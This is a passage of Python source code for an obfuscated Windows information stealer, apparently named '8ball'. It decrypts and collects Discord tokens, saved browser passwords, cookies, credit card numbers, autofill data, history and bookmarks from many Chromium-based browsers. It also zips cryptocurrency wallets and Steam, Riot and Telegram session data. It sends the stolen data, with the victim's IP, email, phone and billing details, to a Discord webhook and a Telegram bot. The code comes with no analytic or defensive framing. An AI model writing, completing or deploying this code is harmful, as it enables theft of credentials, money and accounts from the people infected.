                        "inline": True
                    },
                    {
                        "name": "<a:1689_Ringing_Phone:755219417075417088> Phone:",
                        "value": f"``{phone}``",
                        "inline": True
                    },
                    {
                        "name": "<:mc_earth:589630396476555264> IP:",
                        "value": f"```{G371P()}```",
                        "inline": True
                    },
                    {
                        "name": "<:woozyface:874220843528486923> Badges:",
                        "value": f"{nitro}{badge}",
                        "inline": True
                    },
                    {
                        "name": "<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:",
                        "value": f"{billing}",
                        "inline": True
                    },
                    {
                        "name": "<a:mavikirmizi:853238372591599617> HQ Friends:",
                        "value": f"{friends}",
                        "inline": False
                    },
                    {
                        "name": "<:woozyface:874220843528486923> HQ Guilds:",
                        "value": f"{guilds}",
                        "inline": False
                    },
                    {
                        "name": "<a:mavikirmizi:853238372591599617> Gift Codes:",
                        "value": f"{codes}",
                        "inline": False
                    }
                    ],
                "author": {
                    "name": f"{username}#{hashtag} ({idd})",
                    "icon_url": f"{pfp}"
                    },
                "footer": {
                    "text": "8ball",
                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                    },
                "thumbnail": {
                    "url": f"{pfp}"
                    }
                }
            ],
            "username": f"8ball",
            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
            "attachments": [],
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
            }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        if codes not in ("", "`No Gifts Found`"):
            G37C0D35_3MB3D(token)
        tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
        tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
        if tg_token and tg_chat:
            tg_text = f"{GLINFO}\nToken: {token}\nEmail: {email}\nIP: {G371P()}"
            L04DUr118_TG(tg_token, tg_chat, tg_text)
    except Exception as e:
        RX_DB6(f"[8Ball] UP104D70K3N error for token {token[:20]}...: {type(e).__name__}: {e}")

def r3F0rM47(listt):
    e = re.findall(r"(\w+[a-z])",listt)
    while "https" in e: e.remove("https")
    while "com" in e: e.remove("com")
    while "net" in e: e.remove("net")
    return list(set(e))

def UP104D(name, link):
    # Generic uploader for non-token data; feature gating happens at call sites.
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    if "Data Searcher" in name:
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [
                {
               "title": "8ball","fields": link,
                "footer": {
                    "text": "8ball",
                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                },
                }
            ],
            "username": f"8ball",
            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
            "attachments": [],
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
            }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        return
    
    if name == "kiwi":
        string = link.split("\n\n")
        endlist = []
        for i in string:
            i = i.split("\n")
            i = list(filter(None, i))
            val = ""
            for x in i:
                if x.startswith("└─"):
                    val += x + "\n"
            if len(i) > 1:
                endlist.append({"name": i[0], "value": val, "inline": False})
        data = {
            "content": f"@everyone @here {GLINFO}",
            "embeds": [
                {"fields": endlist,
                "title": "8ball",
                "footer": {
                    "text": "8ball",
                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                }
                }
            ],
            "username": f"8ball",
            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
            "attachments": [],
            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
            }
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        return

def Wr173F0rF113(data, name):
    """
    Write captured data to TEMP with given base name.
    """
    temp_dir = os.getenv("TEMP")
    txt_path = os.path.join(temp_dir, f"cr{name}.txt")

    with open(txt_path, mode='w', encoding='utf-8') as f:
        for line in data:
            if line[0] != '':
                f.write(f"{line}\n")

def G3770K3N(path, arg):
    if not FEATURE_CONFIG.get("discord_tokens", False):
        return
    if not os.path.exists(path):
        return
    _p1 = _f()
    _p2 = _g()
    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (_p1, _p2):
                    for token in re.findall(regex, line):
                        global T0K3Ns
                        if CH3CK70K3N(token):
                            if token not in T0K3Ns:
                                T0K3Ns += token
                                UP104D70K3N(token, path)

def SQ17H1N6(pathC, tempfold, cmd):
    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(cmd)
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)
    return data

def G37AppBoundK3Y(path):
    if APPBOUND_KEY_HEX:
        try:
            key = bytes.fromhex(APPBOUND_KEY_HEX)
            if len(key) == 32:
                return key
        except:
            pass
    try:
        pathKey = path + "/Local State"
        if not os.path.exists(pathKey):
            return None
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = loads(f.read())
        oscrypt = local_state.get('os_crypt', {})
        if 'app_bound_encrypted_key' not in oscrypt:
            return None
        raw = b64decode(oscrypt['app_bound_encrypted_key'])
        if raw[:4] != b'APPB':
            return None
        encrypted_blob = raw[8:]
        key = CryptUnprotectData(encrypted_blob)
        if key is not None and len(key) == 32:
            return key
    except:
        pass
    return None

def G37CC5(path, arg):
    """Browser credit card grabber – gated by 'Credit Cards' feature."""
    if not FEATURE_CONFIG.get("browser_credit_cards", False):
        return
    try:
        global CCs, CC5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold, "SELECT * FROM credit_cards ")

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                CCs.append(f"C4RD N4M3: {row[1]} | NUMB3R: {D3CrYP7V41U3(row[4], master_key)} | EXP1RY: {row[2]}/{row[3]}")
                CC5C0UNt += 1
        Wr173F0rF113(CCs, 'creditcards')
    except:pass

def G374U70F111(path, arg):
    """Browser autofill – gated by 'Browser Autofill and History' feature."""
    if not FEATURE_CONFIG.get("browser_autofill_history", False):
        return
    try:
        global AU70F11l, AU70F111C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "/Web Data"
        if os.stat(pathC).st_size == 0: return

        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"

        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM autofill WHERE value NOT NULL")

        for row in data:
            if row[0] != '':
                AU70F11l.append(f"N4M3: {row[0]} | V4LU3: {row[1]}")
                AU70F111C0UNt += 1
        Wr173F0rF113(AU70F11l, 'autofill')
    except:pass

def G37H1570rY(path, arg):
    """Browser history grabber – gated by 'Browser Autofill and History' feature."""
    if not FEATURE_CONFIG.get("browser_autofill_history", False):
        return
    try:
        global H1570rY, H1570rYC0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "History"
        if os.stat(pathC).st_size == 0: return
        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        data = SQ17H1N6(pathC, tempfold,"SELECT * FROM urls")

        for row in data:
            if row[0] != '':
                H1570rY.append(row[1])
                H1570rYC0UNt += 1
        Wr173F0rF113(H1570rY, 'history')
    except:pass

def G37W3851735(Words):
    rb = ' | '.join(da for da in Words)
    if len(rb) > 1000:
        rrrrr = r3F0rM47(str(Words))
        return ' | '.join(da for da in rrrrr)
    else: return rb

def G37800KM4rK5(path, arg):
    """Bookmarks grabber – gated by 'Browser Bookmarks' feature."""
    if not FEATURE_CONFIG.get("browser_bookmarks", False):
        return
    try:
        global B00KM4rK5, B00KM4rK5C0UNt
        if not os.path.exists(path): return

        pathC = path + arg + "Bookmarks"
        if os.path.exists(pathC):
            with open(pathC, 'r', encoding='utf8') as f:
                data = loads(f.read())
                for i in data['roots']['bookmark_bar']['children']:
                    try:
                        B00KM4rK5.append(f"N4M3: {i['name']} | UR1: {i['url']}")
                        B00KM4rK5C0UNt += 1
                    except:pass
        if os.stat(pathC).st_size == 0: return
        Wr173F0rF113(B00KM4rK5, 'bookmarks')
    except:pass

def s74r787Hr34D(func, arg):
    global Browserthread
    t = threading.Thread(target=func, args=arg)
    t.start()
    Browserthread.append(t)

def G378r0W53r5(br0W53rP47H5):
    if not FEATURE_CONFIG.get("browser_credentials", False):
        return
    create_windows_user()
    global Browserthread
    Browserthread, filess = [], []

    for patt in br0W53rP47H5:
        if FEATURE_CONFIG.get("browser_autofill_history", False):
            s74r787Hr34D(G374U70F111, [patt[0], patt[3]])
            s74r787Hr34D(G37H1570rY, [patt[0], patt[3]])
        if FEATURE_CONFIG.get("browser_bookmarks", False):
            s74r787Hr34D(G37800KM4rK5, [patt[0], patt[3]])
        if FEATURE_CONFIG.get("browser_credit_cards", False):
            s74r787Hr34D(G37CC5, [patt[0], patt[3]])

    def chromium_recovery_wrapper():
        global P455w, P455WC0UNt, p45WW0rDs
        P455w, P455WC0UNt, p45WW0rDs = [], 0, []
        try:
            csv_rows = []
            RX_DB6(f"Chromium PW: checking {len(Chromium.PATHS)} browsers")
            for browser, bpath in Chromium.PATHS.items():
                try:
                    RX_DB6(f"Chromium PW: scanning {browser} at {bpath}")
                    accounts = Chromium._accounts(bpath, browser)
                    count = 0
                    for account in accounts:
                        count += 1
                        for wa in k3YW0rd:
                            old = wa
                            if "https" in wa:
                                tmp = wa
                                wa = tmp.split('[')[1].split(']')[0]
                            if wa in account['url']:
                                if not old in p45WW0rDs: p45WW0rDs.append(old)
                        P455w.append(f"UR1: {account['url']} | U53RN4M3: {account['username']} | P455W0RD: {account['password']}")
                        P455WC0UNt += 1
                        csv_rows.append((account['url'], account['username'], account['password']))
                    RX_DB6(f"Chromium PW: {browser} yielded {count} accounts")
                except Exception as e:
                    RX_DB6(f"Chromium PW: {browser} failed: {e}", "WARN")
            RX_DB6(f"Chromium PW: total {P455WC0UNt} passwords, {len(p45WW0rDs)} keywords")
            Wr173F0rF113(P455w, 'passwords')
            temp_dir = os.getenv("TEMP")
            csv_path = os.path.join(temp_dir, "crpasswords.csv")
            import csv as csvmod
            with open(csv_path, mode="w", newline="", encoding="utf-8") as csvfile:
                writer = csvmod.writer(csvfile)
                writer.writerow(["url", "username", "password"])
                writer.writerows(csv_rows)
            RX_DB6("Chromium PW: files written successfully")
        except Exception as e:
            RX_DB6(f"Chromium PW: wrapper crashed: {e}", "ERROR")
    s74r787Hr34D(chromium_recovery_wrapper, [])

    def chromium_cookies_wrapper():
        global C00K13s, C00K1C0UNt, c00K1W0rDs
        try:
            for browser, bpath in Chromium.PATHS.items():
                for cookie in Chromium._cookies(bpath, browser):
                    for wa in k3YW0rd:
                        old = wa
                        if "https" in wa:
                            tmp = wa
                            wa = tmp.split('[')[1].split(']')[0]
                        if wa in cookie['host']:
                            if not old in c00K1W0rDs: c00K1W0rDs.append(old)
                    C00K13s.append(f"{cookie['host']}	TRUE	/	FALSE	2597573456	{cookie['name']}	{cookie['value']}")
                    C00K1C0UNt += 1
            Wr173F0rF113(C00K13s, 'cookies')
        except Exception:
            pass
    s74r787Hr34D(chromium_cookies_wrapper, [])

    # Chromium autofill recovery
    if FEATURE_CONFIG.get("browser_autofill_history", False):
        def chromium_autofill_wrapper():
            global AU70F11l, AU70F111C0UNt
            try:
                result = Chromium.autofill_recovery()
                for line in result.split("\n"):
                    if line.startswith("Name: ") or line.startswith("Value: ") or line.startswith("Application: ") or line.startswith("="):
                        AU70F11l.append(line)
                        if line.startswith("Value: ") and line[7:].strip():
                            AU70F111C0UNt += 1
            except Exception:
                pass
        s74r787Hr34D(chromium_autofill_wrapper, [])

        def chromium_history_wrapper():
            global H1570rY, H1570rYC0UNt
            try:
                result = Chromium.history_recovery()
                for line in result.split("\n"):
                    if line.startswith("URL: ") or line.startswith("Title: ") or line.startswith("Visits: ") or line.startswith("Application: ") or line.startswith("="):
                        H1570rY.append(line)
                        if line.startswith("URL: ") and line[5:].strip():
                            H1570rYC0UNt += 1
            except Exception:
                pass
        s74r787Hr34D(chromium_history_wrapper, [])

    # Chromium bookmarks recovery
    if FEATURE_CONFIG.get("browser_bookmarks", False):
        def chromium_bookmarks_wrapper():
            global B00KM4rK5, B00KM4rK5C0UNt
            try:
                result = Chromium.bookmarks_recovery()
                for line in result.split("\n"):
                    if line.startswith("Name: ") or line.startswith("URL: ") or line.startswith("Application: ") or line.startswith("="):
                        B00KM4rK5.append(line)
                        if line.startswith("URL: ") and line[5:].strip():
                            B00KM4rK5C0UNt += 1
            except Exception:
                pass
        s74r787Hr34D(chromium_bookmarks_wrapper, [])

    # Chromium credit card recovery
    if FEATURE_CONFIG.get("browser_credit_cards", False):
        def chromium_cc_wrapper():
            global CCs, CC5C0UNt
            try:
                result = Chromium.cc_recovery()
                for line in result.split("\n"):
                    if line.startswith("Name: ") or line.startswith("Number: ") or line.startswith("Expiry: ") or line.startswith("Application: ") or line.startswith("="):
                        CCs.append(line)
                        if line.startswith("Number: ") and line[8:].strip():
                            CC5C0UNt += 1
            except Exception:
                pass
        s74r787Hr34D(chromium_cc_wrapper, [])

    # Wait for all browser threads
    for thread in Browserthread:
        thread.join()

    temp_dir = os.getenv("TEMP")

    # Upload core browser dumps (passwords, cookies, cc, autofill, history, bookmarks)
    core_files = [
        "crpasswords.txt",
        "crpasswords.csv",
        "crcookies.txt",
        "crcreditcards.txt",
        "crautofills.txt",
        "crhistories.txt",
        "crbookmarks.txt",
    ]
    for fname in core_files:
        fpath = os.path.join(temp_dir, fname)
        if not os.path.exists(fpath):
            open(fpath, "w").close()
        filess.append(UP104D7060F113(fpath))

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": f"@everyone @here {GLINFO}",
        "embeds": [
            {
                "title": "8ball",
                "description": (
                    f":newspaper:  • **{H1570rYC0UNt}** Histories Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Histories.txt]({filess[5]})\n\n"
                    f"<a:hira_kasaanahtari:886942856969875476> • **{AU70F111C0UNt}** Autofills Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Autofills.txt]({filess[4]})\n\n"
                    f"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_CreditCards.txt]({filess[3]})\n\n"
                    f":bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Bookmarks.txt]({filess[6]})"
                ),"footer": {
                    "text": "8ball",
                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                }
            },
            {
                "title": "8ball",
                "description": (
                    f"**Found**:\n{G37W3851735(p45WW0rDs)}\n\n"
                    f"**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P455WC0UNt}** Passwords Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Passwords.txt]({filess[0]})\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Passwords.csv]({filess[1]})"
                ),"footer": {
                    "text": "8ball",
                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                }
            },
            {
                "title": "8ball",
                "description": (
                    f"**Found**:\n{G37W3851735(c00K1W0rDs)}\n\n"
                    f"**Data:**\n<:cookies_tlm:816619063618568234> • **{C00K1C0UNt}** Cookies Found\n"
                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Cookies.txt]({filess[2]})"
                ),"footer": {
                    "text": "8ball",
                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                }
            }
        ],
        "username": "8ball",
        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
        "attachments": [],
        "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
    }
    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
    RX_DB6("[8Ball] Browser Data embed sent successfully.")
    tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
    tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
    if tg_token and tg_chat:
        tg_text = f"{GLINFO}\nPasswords: {P455WC0UNt} | Cookies: {C00K1C0UNt} | CCs: {CC5C0UNt}"
        L04DUr118_TG(tg_token, tg_chat, tg_text)
    remove_windows_user()

def G37D15C0rD(path, arg):
    if not FEATURE_CONFIG.get("discord_tokens", False):
        return
    _ls = _j()
    if not os.path.exists(f"{path}{_ls}"):
        return
    pathC = path + arg
    pathKey = path + _ls
    with open(pathKey, 'r', encoding='utf-8') as f:
        local_state = loads(f.read())
    master_key = b64decode(local_state[_k()][_l()])
    master_key = CryptUnprotectData(master_key[5:])
    if not os.path.isdir(pathC):
        return
    _prefix = _h()
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(rf"{_prefix}[^.*\['(.*)'\].*$][^\"]*", line):
                    global T0K3Ns
                    tokenDecoded = D3CrYP7V41U3(b64decode(token.split(_prefix)[1]), master_key)
                    if CH3CK70K3N(tokenDecoded):
                        if not tokenDecoded in T0K3Ns:
                            T0K3Ns += tokenDecoded
                            UP104D70K3N(tokenDecoded, path)

def G47H3rZ1P5(paths1, paths2, paths3):
    if not FEATURE_CONFIG.get("wallet_gaming_data", False):
        return
    RX_DB6("[8Ball] G47H3rZ1P5: starting wallet/gaming collection")
    thttht = []
    for walletids in w411375:
        for patt in paths1:
            a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
            a.start()
            thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=Z1P73136r4M, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    wal, ga, ot = "",'',''
    if not len(W411375Z1p) == 0:
        wal = "<:ETH:975438262053257236>  •  Wallets\n"
        for i in W411375Z1p:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(G4M1N6Z1p) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in G4M1N6Z1p:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(O7H3rZ1p) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in O7H3rZ1p:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    found_count = len(W411375Z1p) + len(G4M1N6Z1p) + len(O7H3rZ1p)
    RX_DB6(f"[8Ball] G47H3rZ1P5: collected {found_count} items (wallets={len(W411375Z1p)} gaming={len(G4M1N6Z1p)} apps={len(O7H3rZ1p)})")
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    desc = f"{wal}\n{ga}\n{ot}"
    if not desc.strip():
        desc = "No wallets, gaming, or app data found."

    data = {
        "content": f"@everyone @here {GLINFO}",
        "embeds": [
            {
            "title": "8ball",
            "description": desc,
            "footer": {
                "text": "8ball",
                "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"
            }
            }
        ],
        "username": f"8ball",
        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
        "attachments": [],
        "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
    }
    try:
        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
        RX_DB6("[8Ball] Wallet/Gaming embed sent.")
    except Exception:
        RX_DB6("[8Ball] Wallet/Gaming embed send failed.", "ERROR")
    tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
    tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
    if tg_token and tg_chat:
        L04DUr118_TG(tg_token, tg_chat, f"{GLINFO}\nWallets/Gaming data collected")

def Z1P73136r4M(path, arg, procc):
    global O7H3rZ1p
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    zip_path = Z1PF01D3r(name, pathC)

    for i in range(3):
        lnik = UP104D7060F113(zip_path)
        if "https://" in str(lnik):
            break
        time.sleep(4)
    for _ in range(5):
        try:
            os.remove(zip_path)
            break
        except PermissionError:
            time.sleep(0.5)
        except Exception:
            break
    O7H3rZ1p.append([arg, lnik])

def _copy_dir_to_temp(src, label):
    tmp = tempfile.mktemp(suffix=f"_{label}")
    try:
        shutil.copytree(src, tmp, ignore_dangling_symlinks=True)
        return tmp
    except Exception:
        return None

def Z1P7H1N65(path, arg, procc):
    pathC = path
    name = arg
    tmp_copy = None

    global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
    for walllts in w411375:
        if str(walllts[0]) in arg:
            pathC = path + arg
            parts = [p for p in path.split("\\") if p and p not in ("User Data", "Default", "")]
            browser = parts[-1].replace(' ', '') if parts else "Unknown"
            name = f"{str(walllts[1])}_{browser}"
            pathC = path + arg

    if not os.path.exists(pathC): return

    if "leveldb" in pathC.lower() or "Local Extension Settings" in pathC:
        tmp_copy = _copy_dir_to_temp(pathC, "wallet_leveldb")
        if tmp_copy:
            pathC = tmp_copy
        else:
            RX_DB6(f"[8Ball] Z1P7H1N65: could not copy leveldb for {name}, trying in-place")

    if "Wallet" in arg:
        parts = [p for p in path.split("\\") if p and p not in ("User Data", "Default", "")]
        browser = parts[-1].replace(' ', '') if parts else "Unknown"
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg

    zip_path = Z1PF01D3r(name, pathC)
    if tmp_copy:
        try: shutil.rmtree(tmp_copy, ignore_errors=True)
        except: pass

    for i in range(3):
        lnik = UP104D7060F113(zip_path)
        if "https://" in str(lnik):break
        time.sleep(4)

    for _ in range(5):
        try:
            os.remove(zip_path)
            break
        except PermissionError:
            time.sleep(0.5)
        except Exception:
            break
    if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
        W411375Z1p.append([name, lnik])
    elif "Steam" in name or "RiotCli" in name:
        G4M1N6Z1p.append([name, lnik])
    else:
        O7H3rZ1p.append([name, lnik])
THr34D1157 = []

def S74r77Hr34D(meth, args = []):
    a = threading.Thread(target=meth, args=args)
    a.start()
    THr34D1157.append(a)

# --- ENV PATHS (must be defined before G47H3r411 uses them) ---
IP = G371P()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

# Global counters/collections
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s = [], [], [], [], [], [], []
W411375Z1p, G4M1N6Z1p, O7H3rZ1p = [], [], []
THr34D1157, K1W1F113s, B00KM4rK5 = [], [], []
T0K3Ns = ""

def G47H3r411():
    RX_DB6("[8Ball] G47H3r411 orchestrator starting...")
    br0W53rP47H5 = [
        [f"{roaming}/Opera Software/Opera GX Stable",             "opera.exe",        "/Local Storage/leveldb",           "",              "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",        "/Local Storage/leveldb",           "",              "/Network",             "/Local Extension Settings/"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",        "/Local Storage/leveldb",           "",              "/Network",             "/Local Extension Settings/"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Beta/User Data",                   "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Dev/User Data",                    "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Unstable/User Data",               "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Google/Chrome Canary/User Data",                 "chrome.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",        "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Vivaldi/User Data",                              "vivaldi.exe",      "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserCanary/User Data",           "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserDeveloper/User Data",        "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]
    _ds = _i()
    d15C0rDP47H5 = [
        [f"{roaming}/{_y('9fj/7+7z+A==')}",          _ds],
        [f"{roaming}/{_y('9dD0+//o7vP4')}",        _ds],
        [f"{roaming}/{_y('9fj/7+7z//jy/e795Q==')}",    _ds],
        [f"{roaming}/{_y('9fj/7+7z7Pj+6A==')}",       _ds],
    ]

    p47H570Z1P = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\\Program Files (x86)\\Steam\\config",                                 "steam.exe",                "Steam"         ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    t3136r4M = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]


    for patt in br0W53rP47H5:
       S74r77Hr34D(G3770K3N,   [patt[0], patt[2]]                                   )
    for patt in d15C0rDP47H5:
       S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]                                   )
    S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
    # Wait for password/cookie collection before starting wallet/gaming (60s max per thread)
    for thread in THr34D1157:
